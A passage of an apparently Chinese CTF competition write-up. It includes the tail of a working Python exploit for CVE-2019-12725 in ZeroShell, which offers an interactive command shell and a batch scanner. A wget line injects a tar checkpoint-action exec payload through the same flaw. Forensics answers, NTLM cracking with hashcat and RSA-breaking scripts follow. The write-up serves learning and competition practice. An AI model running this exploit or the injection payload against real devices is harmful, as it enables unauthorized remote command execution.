class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\033[31m[-]%s is not vuln\033[0m&quot;</span> %url1)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\033[31m[-]%s is timeout\033[0m&quot;</span> %url2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#cmdshell</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmdshell</span>(<span class="params">url</span>):</span><br><span class="line"><span class="keyword">if</span> check_vuln(url)==<span class="number">1</span>:</span><br><span class="line">url = parse.urlparse(url)</span><br><span class="line">url1 = url.scheme + <span class="string">&#x27;://&#x27;</span> + url.netloc + <span class="string">&#x27;/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=%27%0A&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">shell = <span class="built_in">input</span>(<span class="string">&quot;\033[35mcmd: \033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> shell ==<span class="string">&quot;exit&quot;</span>:</span><br><span class="line">sys.exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: get_ua(),</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">res = requests.get(url1 + shell + <span class="string">&#x27;%0A%27&#x27;</span>,headers=headers,timeout=<span class="number">10</span>,verify=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">if</span> res.status_code==<span class="number">200</span> <span class="keyword">and</span> <span class="built_in">len</span>(res.text) != <span class="number">0</span>:</span><br><span class="line">vulntext=res.text.split(<span class="string">&#x27;&lt;html&gt;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\033[32m%s\033[0m&quot;</span> %vulntext[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\033[31m[-]%s Command execution failed !\033[0m&quot;</span> %url1)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\033[31m[-]%s is timeout!\033[0m&quot;</span> %url1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#多线程</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multithreading</span>(<span class="params">url_list, pools=<span class="number">5</span></span>):</span><br><span class="line">works = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> url_list:</span><br><span class="line"><span class="comment"># works.append((func_params, None))</span></span><br><span class="line">works.append(i)</span><br><span class="line"><span class="comment"># print(works)</span></span><br><span class="line">pool = threadpool.ThreadPool(pools)</span><br><span class="line">reqs = threadpool.makeRequests(check_vuln, works)</span><br><span class="line">[pool.putRequest(req) <span class="keyword">for</span> req <span class="keyword">in</span> reqs]</span><br><span class="line">pool.wait()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">show = <span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"> _____ _   _ _____       _____  _____  __   _____        __   _____  ___________  _____ </span></span><br><span class="line"><span class="string">/  __ \ | | |  ___|     / __  \|  _  |/  | |  _  |      /  | / __  \|___  / __  \|  ___|</span></span><br><span class="line"><span class="string">| /  \/ | | | |__ ______`&#x27; / /&#x27;| |/&#x27; |`| | | |_| |______`| | `&#x27; / /&#x27;   / /`&#x27; / /&#x27;|___ \ </span></span><br><span class="line"><span class="string">| |   | | | |  __|______| / /  |  /| | | | \____ |______|| |   / /    / /   / /      \ \</span></span><br><span class="line"><span class="string">| \__/\ \_/ / |___      ./ /___\ |_/ /_| |_.___/ /      _| |_./ /___./ /  ./ /___/\__/ /</span></span><br><span class="line"><span class="string"> \____/\___/\____/      \_____/ \___/ \___/\____/       \___/\_____/\_/   \_____/\____/ </span></span><br><span class="line"><span class="string">                                                                                        </span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                  </span></span><br><span class="line"><span class="string">                                                                                                      </span></span><br><span class="line"><span class="string">                                                   CVE-2019-12725 By m2</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(show + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">arg=ArgumentParser(description=<span class="string">&#x27;CVE-2019-12725 By m2&#x27;</span>)</span><br><span class="line">arg.add_argument(<span class="string">&quot;-u&quot;</span>,</span><br><span class="line"><span class="string">&quot;--url&quot;</span>,</span><br><span class="line"><span class="built_in">help</span>=<span class="string">&quot;Target URL; Example:http://ip:port&quot;</span>)</span><br><span class="line">arg.add_argument(<span class="string">&quot;-f&quot;</span>,</span><br><span class="line"><span class="string">&quot;--file&quot;</span>,</span><br><span class="line"><span class="built_in">help</span>=<span class="string">&quot;Target URL; Example:url.txt&quot;</span>)</span><br><span class="line">arg.add_argument(<span class="string">&quot;-c&quot;</span>,</span><br><span class="line"><span class="string">&quot;--cmd&quot;</span>,</span><br><span class="line"><span class="built_in">help</span>=<span class="string">&quot;Target URL; Example:http://ip:port&quot;</span>)</span><br><span class="line">args=arg.parse_args()</span><br><span class="line">url=args.url</span><br><span class="line">filename=args.file</span><br><span class="line">cmd=args.cmd</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[*]任务开始...&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> url != <span class="literal">None</span> <span class="keyword">and</span> cmd == <span class="literal">None</span> <span class="keyword">and</span> filename == <span class="literal">None</span>:</span><br><span class="line">check_vuln(url)</span><br><span class="line"><span class="keyword">elif</span> url == <span class="literal">None</span> <span class="keyword">and</span> cmd == <span class="literal">None</span> <span class="keyword">and</span> filename != <span class="literal">None</span>:</span><br><span class="line">start=time()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">open</span>(filename):</span><br><span class="line">i=i.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">check_vuln(i)</span><br><span class="line">end=time()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;任务完成，用时%d&#x27;</span> %(end-start))</span><br><span class="line"><span class="keyword">elif</span> url == <span class="literal">None</span> <span class="keyword">and</span> cmd != <span class="literal">None</span> <span class="keyword">and</span> filename == <span class="literal">None</span>:</span><br><span class="line">cmdshell(cmd)</span><br></pre></td></tr></table></figure><p>然后运行，</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216085303408-1275301654.png" alt="image-20241216085252236"></p><p>然后去找flag，在<code>/Database/flag</code>下面。</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216085308199-886976928.png" alt="image-20241216085257643"></p><p><code>flag&#123;c6045425-6e6e-41d0-be09-95682a4f65c4&#125;</code></p><h2 id="zeroshell-3"><a href="#zeroshell-3" class="headerlink" title="zeroshell_3"></a>zeroshell_3</h2><p>查看主机的外联服务器的所有TCP，UDP，IP和进程使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -antp</span><br></pre></td></tr></table></figure><p>（但是有点抽象，有时候看不到那个IP，）其他都是127.0.0.1只有他一个。</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216085406663-304992750.png" alt="image-20241216085355787"></p><p><code>flag&#123;202.115.89.103&#125;</code></p><h2 id="zeroshell-4"><a href="#zeroshell-4" class="headerlink" title="zeroshell_4"></a>zeroshell_4</h2><p>直接找可执行文件像.sh或者.nginx这种使用命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -name <span class="string">&quot;.sh&quot;</span></span><br><span class="line">find / -name <span class="string">&quot;.nginx&quot;</span></span><br></pre></td></tr></table></figure><p>.sh文件没有，发现.nginx很多，尝试一下。</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216085759698-1634771253.png" alt="image-20241216085749134"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216085915696-1839610967.png" alt="image-20241216085905063"></p><p><code>flag&#123;.nginx&#125;</code></p><h2 id="zeroshell-5"><a href="#zeroshell-5" class="headerlink" title="zeroshell_5"></a>zeroshell_5</h2><p>本身是一个RCE的洞，可以直接远程下载，用wget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget <span class="string">&quot;http://61.139.2.100/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=&#x27;%0A/etc/sudo%20tar%20-cf%20/dev/null%20/dev/null%20--checkpoint=1%20--checkpoint-action=exec=&#x27;cat%20/tmp/.nginx&#x27;%0A&#x27;&quot;</span></span><br></pre></td></tr></table></figure><p>然后直接把1.nginx dump下来，拉到ida，然后shift+f12直接找密钥了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216085949719-1509725601.png" alt="image-20241216085938811"></p><p><code>flag&#123;11223344qweasdzxc&#125;</code></p><h2 id="zeroshell-6"><a href="#zeroshell-6" class="headerlink" title="zeroshell_6"></a>zeroshell_6</h2><p>题目说找到木马的启动项，直接ps -aux查看进程发现很多apache自带的进程，可疑的就几个，注意看这个进程</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090015789-1349072241.png" alt="image-20241216090004900"></p><p>一级一级网上找然后在system目录下面发现一个startup</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090031219-684402653.png" alt="image-20241216090020550"></p><p>往startup下面一个个找也不多，然后找到最终地方</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090039122-1056220359.png" alt="image-20241216090028452"></p><p><code>flag&#123;/var/register/system/startup/scripts/nat/File&#125;</code></p><h2 id="WinFT-1"><a href="#WinFT-1" class="headerlink" title="WinFT_1"></a>WinFT_1</h2><p>题目说找受控机木马的回连域名及ip及端口，</p><p>直接看机器里面的第一个文件exe</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090519510-272396622.png" alt="image-20241216090508053"></p><p>看见最后一个进程里面就有，得到flag</p><p><code>flag&#123;miscsecure.com:192.168.116.130:443&#125;</code></p><h2 id="WinFT-2"><a href="#WinFT-2" class="headerlink" title="WinFT_2"></a>WinFT_2</h2><p>说是启动项里面的flag一开始还是去msconfig里面找的，结果不知道，一想肯定不是exe，然后去计划任务看，</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090546842-57224494.png" alt="image-20241216090536136"></p><p>然后放Cyberchef里面解出来。</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090553292-1213496669.png" alt="image-20241216090542540"></p><p>解出flag</p><p><code>flag&#123;AES_encryption_algorithm_is_an_excellent_encryption_algorithm&#125;</code></p><h2 id="WinFT-5"><a href="#WinFT-5" class="headerlink" title="WinFT_5"></a>WinFT_5</h2><p>直接把流量放kali里面，binwalk分析</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090709285-1559417030.png" alt="image-20241216090658443"></p><p>发现位于22258409的偏移位置存在flag.txt</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090714616-1417817657.png" alt="image-20241216090703882"></p><p>使用dd命令分离，提取出来</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090720160-2147403155.png" alt="image-20241216090709460"></p><p>发现需要密码，</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090729621-221989880.png" alt="image-20241216090718742"></p><p>然后把zip放0101里面，发现有东西，</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090734963-1252085038.png" alt="image-20241216090724351"></p><p>放到Cyberchef里面解出密码：时间线关联非常重要</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090746208-2119841521.png" alt="image-20241216090735485"></p><p>解出flag</p><p><code>flag&#123;a1b2c3d4e5f67890abcdef1234567890-2f4d90a1b7c8e2349d3f56e0a9b01b8a-CBC&#125;</code></p><h2 id="sc05-1"><a href="#sc05-1" class="headerlink" title="sc05_1"></a>sc05_1</h2><p>这个题直接打开execl，转到tcp-export的位置，直接找到时间</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090813314-536377005.png" alt="image-20241216090802255"></p><p>2024/11/09_16:22:42这是时间，MD5编码一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090839866-1852212176.png" alt="image-20241216090829208"></p><p>得到<code>flag&#123;01DF5BC2388E287D4CC8F11EA4D31929&#125;</code></p><h2 id="Kiwi"><a href="#Kiwi" class="headerlink" title="Kiwi"></a>Kiwi</h2><p>exe直接拉ida之后，发现是个<code>mimikatz</code>程序，<code>lsadump::lsa /patch</code> 是这个程序的命令参数，作用是导出lsa，目的就是找这个东西，所以本题的逻辑就是去逆这个玩意儿</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091125302-903395086.png" alt="image-20241216091114310"></p><p>主要看下面的几个函数，先看函数sub_140082974，先是对input有一步异或，异或的逻辑是初始化了一个变量v6，而v6的值可以通过变量unk_140111152中有一个获取，然后循环v5的次数，得到v6的值，就是一个伪随机数，然后得到的数再在下面做一个变表的base64</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091133647-585107726.png" alt="image-20241216091122644"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091140755-348375415.png" alt="image-20241216091129821"></p><p>最后main里面的函数sub_140082774感觉就是一个将加密之后的结果上传的功能，然后给了流量包，那么去流量包里找密文即可</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091150949-544335224.png" alt="image-20241216091140032"></p><p>然后去看流量包，筛选一下http流量的upload流</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091158279-451596707.png" alt="image-20241216091147708"></p><p>然后发现三个包里的密文都是一样的</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091206352-768869769.png" alt="image-20241216091155375"></p><p>那么直接逆即可，懒得模拟随机数v6计算的过程，直接动调随机数种子就好了，然后直接解变表之后的数据即可</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091227952-1415334478.png" alt="image-20241216091216995"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> temp[<span class="number">178</span>]=&#123;<span class="number">0xb9</span>,<span class="number">0x48</span>,<span class="number">0x1c</span>,<span class="number">0x58</span>,<span class="number">0x81</span>,<span class="number">0x4f</span>,<span class="number">0x51</span>,<span class="number">0x7d</span>,<span class="number">0x27</span>,<span class="number">0x70</span>,<span class="number">0x33</span>,<span class="number">0x6f</span>,<span class="number">0x79</span>,<span class="number">0x48</span>,<span class="number">0x82</span>,<span class="number">0x21</span>,<span class="number">0x08</span>,<span class="number">0x80</span>,<span class="number">0x79</span>,<span class="number">0x49</span>,<span class="number">0x51</span>,<span class="number">0x52</span>,<span class="number">0x28</span>,<span class="number">0x9b</span>,<span class="number">0x7d</span>,<span class="number">0xbb</span>,<span class="number">0x40</span>,<span class="number">0x67</span>,<span class="number">0x45</span>,<span class="number">0x7a</span>,<span class="number">0x96</span>,<span class="number">0x38</span>,<span class="number">0x3e</span>,<span class="number">0x7d</span>,<span class="number">0x41</span>,<span class="number">0x42</span>,<span class="number">0x86</span>,<span class="number">0x60</span>,<span class="number">0x4f</span>,<span class="number">0x6c</span>,<span class="number">0x3b</span>,<span class="number">0x87</span>,<span class="number">0x2e</span>,<span class="number">0x26</span>,<span class="number">0x72</span>,<span class="number">0x51</span>,<span class="number">0x83</span>,<span class="number">0x80</span>,<span class="number">0x79</span>,<span class="number">0xbd</span>,<span class="number">0x79</span>,<span class="number">0x40</span>,<span class="number">0x67</span>,<span class="number">0x71</span>,<span class="number">0x4a</span>,<span class="number">0xa2</span>,<span class="number">0x98</span>,<span class="number">0x76</span>,<span class="number">0x3a</span>,<span class="number">0x8f</span>,<span class="number">0x68</span>,<span class="number">0xda</span>,<span class="number">0x7f</span>,<span class="number">0x74</span>,<span class="number">0x2a</span>,<span class="number">0x33</span>,<span class="number">0x55</span>,<span class="number">0x8d</span>,<span class="number">0x5e</span>,<span class="number">0x2b</span>,<span class="number">0x39</span>,<span class="number">0x6d</span>,<span class="number">0xbe</span>,<span class="number">0x5f</span>,<span class="number">0x74</span>,<span class="number">0x74</span>,<span class="number">0x7d</span>,<span class="number">0x11</span>,<span class="number">0x8e</span>,<span class="number">0x4b</span>,<span class="number">0x4d</span>,<span class="number">0x99</span>,<span class="number">0x64</span>,<span class="number">0x79</span>,<span class="number">0x63</span>,<span class="number">0xb3</span>,<span class="number">0x73</span>,<span class="number">0xca</span>,<span class="number">0x31</span>,<span class="number">0x90</span>,<span class="number">0xc3</span>,<span class="number">0x77</span>,<span class="number">0x1b</span>,<span class="number">0x6f</span>,<span class="number">0x61</span>,<span class="number">0x52</span>,<span class="number">0x11</span>,<span class="number">0xbc</span>,<span class="number">0xbd</span>,<span class="number">0x86</span>,<span class="number">0xb2</span>,<span class="number">0x78</span>,<span class="number">0x4f</span>,<span class="number">0x7e</span>,<span class="number">0x56</span>,<span class="number">0x8f</span>,<span class="number">0x6c</span>,<span class="number">0x94</span>,<span class="number">0xb4</span>,<span class="number">0x3a</span>,<span class="number">0x7f</span>,<span class="number">0x14</span>,<span class="number">0x4b</span>,<span class="number">0x79</span>,<span class="number">0xb6</span>,<span class="number">0x8c</span>,<span class="number">0xb0</span>,<span class="number">0xad</span>,<span class="number">0x8b</span>,<span class="number">0x67</span>,<span class="number">0x6d</span>,<span class="number">0xd1</span>,<span class="number">0x7a</span>,<span class="number">0x9a</span>,<span class="number">0xa7</span>,<span class="number">0x31</span>,<span class="number">0x74</span>,<span class="number">0x25</span>,<span class="number">0x3e</span>,<span class="number">0x61</span>,<span class="number">0x2e</span>,<span class="number">0x82</span>,<span class="number">0x3d</span>,<span class="number">0x63</span>,<span class="number">0x5e</span>,<span class="number">0x77</span>,<span class="number">0x6b</span>,<span class="number">0x7c</span>,<span class="number">0x3f</span>,<span class="number">0x24</span>,<span class="number">0x65</span>,<span class="number">0x35</span>,<span class="number">0x9f</span>,<span class="number">0x53</span>,<span class="number">0x84</span>,<span class="number">0x92</span>,<span class="number">0x42</span>,<span class="number">0xa0</span>,<span class="number">0x7d</span>,<span class="number">0x66</span>,<span class="number">0x70</span>,<span class="number">0x3b</span>,<span class="number">0xd3</span>,<span class="number">0x65</span>,<span class="number">0xa2</span>,<span class="number">0x6d</span>,<span class="number">0x7f</span>,<span class="number">0x19</span>,<span class="number">0x92</span>,<span class="number">0x7a</span>,<span class="number">0x8c</span>,<span class="number">0xb8</span>,<span class="number">0x6b</span>,<span class="number">0x12</span>,<span class="number">0x18</span>,<span class="number">0x66</span>,<span class="number">0x74</span>,<span class="number">0xc0</span>,<span class="number">0x48</span>,<span class="number">0x64</span>,<span class="number">0x9d</span>,<span class="number">0x0e</span>,<span class="number">0x6f</span>,<span class="number">0x53</span>,<span class="number">0x96</span>,<span class="number">0x49</span>,<span class="number">0x61</span>,<span class="number">0x5d</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> bbq;</span><br><span class="line">    <span class="built_in">srand</span>(<span class="number">0x69</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">178</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            bbq=temp[i]-(<span class="built_in">rand</span>()%<span class="number">128</span>);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,bbq^<span class="number">0x69</span>&amp;<span class="number">0xff</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091236273-1371002148.png" alt="image-20241216091225651"></p><p>然后直接把Lihua的NTLM去撞一下hash</p><p>直接上工具，得到密码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m <span class="number">1000</span> -a <span class="number">0</span> --force <span class="number">23</span>d1e086b85cc18587bbc8c33adefe07 /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091249996-1016038955.png" alt="image-20241216091239077"></p><p><code>flag&#123;memeallme!&#125;</code></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="rasnd"><a href="#rasnd" class="headerlink" title="rasnd"></a>rasnd</h2><p>基本上和DownUnderCTF apbq rsa i一致，密码系统的漏洞在于$x_1,x_2$的位数太小了，我们可以对hint1和hint2两边分别乘上$x_2,x_1$，然后两式相减构造出因子$q$，这样一来我们就可以和模数$n$求gcd得到我们的p，q了，完整的推导过程如下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091546611-1355733929.png" alt="image-20241216091535974"></p><p>第一段flag的脚本拿maple的改改就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n1 = <span class="number">12041484248912643032281827138855623754144214035159379257661479163138740691775879744970066188895287834305299993544492956391792960896102848747030186725527727462894712060700333010084161232292945341786532686079371670477415860442278642697221340583569645588845014599550638325912186989334147835969874061056581067882184577796454285728001596032991576548616505694738258644347926711399658118922938510938119887205321934129700411659944514995029920532395752664247590123953777766329926456117538440392869407741390284440815213055049158646992117671363087867033230162348771385273345393144890080701361216495994574190386498448916311816797</span></span><br><span class="line">c1 = <span class="number">10606131316309955980934489999367845331927443863828583686141238316607269050684817039429298888781427841737522428868990033129396359422071583487650116153933235992772589074023014756603570826140692683719646462908402695451323182710065741160367461533107537946979392683247488668328727583897596393913788430745564403219132250771930726681544778750383056036694256341891369906160656846870749190113082284100872538571850988590168260190474932411452384081833324921809119609733433067883975638920071176430344363427978212930714208437515478915112319607619770956843101985777866969917968203033417800410149877887005212278008964025655987940957</span></span><br><span class="line">hint1 = <span class="number">1210163329385529229728939135743311954497267498380547164909234906003973611593798031761260290741249172090725684217414693693114449324670072882779106749063248097663867799443199777334875204112817022790357889479347171489446008099356250837065466918892616549927163255749494695158589358908509028746798132552909553239850862487264153570503905570515124883</span></span><br><span class="line">hint2 = <span class="number">5051204836955493115902299043864227023948832461277034652488258835184221521626345855566463934505556519381805282442109159775267806057755363491698274342564684351612127794982915561668169373789547317570427657539052251405041553056803632890416687608340386053780952769614333767097202054166611376586274576239144083005297435121927157297060690207800186682896326015350219721047026234504118337172881814255423542199000966155216738725842757720428244680380446841837035234700310983</span></span><br><span class="line">apbq1 = hint1 + <span class="number">0x114</span></span><br><span class="line">apbq2 = hint2 + <span class="number">0x514</span></span><br><span class="line"></span><br><span class="line">h1, h2 = apbq1, apbq2</span><br><span class="line"><span class="keyword">for</span> a1, a2 <span class="keyword">in</span> product(trange(<span class="number">2</span>**<span class="number">12</span>), repeat=<span class="number">2</span>):</span><br><span class="line">    q = gcd(a1*h1 - a2*h2, n1)</span><br><span class="line">    <span class="keyword">if</span> q != <span class="number">1</span> <span class="keyword">and</span> q&lt;n1:</span><br><span class="line">        <span class="built_in">print</span>(q,n1)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">q = <span class="number">114411205592246972220921230297242077940657645574270285474331214662896407392806621491630870605100409685745977685037681045756459767749822052290189670280723035164949944851395458359172624983161919320250363279972807380631771541310372109230847026234642522745139142418827828880645203931389076624693764995135409308641</span></span><br><span class="line">p = n1 // q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = invert(e, phi)</span><br><span class="line">flag = long_to_bytes(<span class="built_in">pow</span>(c1, d, n1))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>得到第一段flag：flag{d50d53cd-e2ce-</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091602094-2096860699.png" alt="image-20241216091551494"></p><p>第二部分就是一个有限域下的逆元，对hint求逆元我们可以得到两个等式</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091623283-945716044.png" alt="image-20241216091612697"></p><p>直接z3解方程，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n2 = <span class="number">21626909171908453692251924387103943429444078378390804029791359086344901457614128315777353777946154715705188025455454883506581852192745448695330171712065848059085447176298338547611168540505303622649991647459241389851267706481741195973923366166350969428740106246575652922070364437283707248673414247015834408154336841845500174634585533145550612240655077795822499312831628265010867392272132327421316583927430144370227936025377802536431841460046560013098106494136549616711676888653891244666437683890387799042293066126208312839317392500611947692798756916972089791796065424069966139988959825520104626886407271566397598014479</span></span><br><span class="line">c2 = <span class="number">569516604779891642229626563202425917599205242605000009759024900334197676760498875709356073629224710968242118774272590035957794014944814569027666346273772760891740151661832004406395109811886627118507348575757378450205961170154177578337894121169344562117847542197369098179880407292635572736750972421301634710104680523760640958412310434786115630793487435865984193741176650867539434921286751815555011295375372628772142693142157388409831904845942568574027054385393890634270431602503271189772689768282466095937885481574735502991070696612305833770499878657295850059864341504403869711352220766605065553807072723398104147275</span></span><br><span class="line">hint = <span class="number">7354993101719521835942057560559580408743463323132751631614029356471066763586282676677888312943475827012461736138179904586928941942658362522899594590538632189792057377645275207357701819794899897630241261959366946307314047096789448491079019668061348270530520611478739108630519794038167843924690066067571126829134798676602734885527731532719971211866068475981470917729745697545742042055696088126726481101239997605997896836996320123720551222524217796125190116733813486368990126242621202368626320634775326774029367415577855148616903730121702683124218622095514962048699336270886055555358735126758449948884277874079744761833</span></span><br><span class="line"></span><br><span class="line">x = inverse(hint, n2)</span><br><span class="line"></span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line">p = Int(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">q = Int(<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line"></span><br><span class="line">solver.add(<span class="number">514</span> * p - <span class="number">114</span> * q == x)</span><br><span class="line">solver.add(p * q == n2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">    model = solver.model()</span><br><span class="line">    p_val = model[p].as_long()</span><br><span class="line">    q_val = model[q].as_long()</span><br><span class="line"></span><br><span class="line">    d = inverse(<span class="number">0x10001</span>, (p_val - <span class="number">1</span>) * (q_val - <span class="number">1</span>))</span><br><span class="line">    